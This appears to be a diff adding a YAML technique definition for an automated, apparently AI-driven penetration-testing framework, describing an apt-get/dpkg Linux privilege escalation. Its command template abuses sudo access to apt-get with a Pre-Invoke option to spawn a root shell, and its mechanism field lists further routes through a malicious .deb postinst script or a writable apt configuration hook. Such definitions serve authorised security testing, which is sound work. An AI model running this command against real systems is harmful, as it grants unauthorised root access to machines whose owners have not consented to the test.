@@ -1,0 +1,16 @@
+name: apt_get_privesc
+category: privesc
+description: apt-get/dpkg privilege escalation
+preconditions:
+  - os==linux
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "If sudo allows apt-get: Pre-Invoke for shell. If sudo allows dpkg: dpkg -i malicious.deb with postinst script. If apt conf dir is writable: add Pre-Invoke hook."
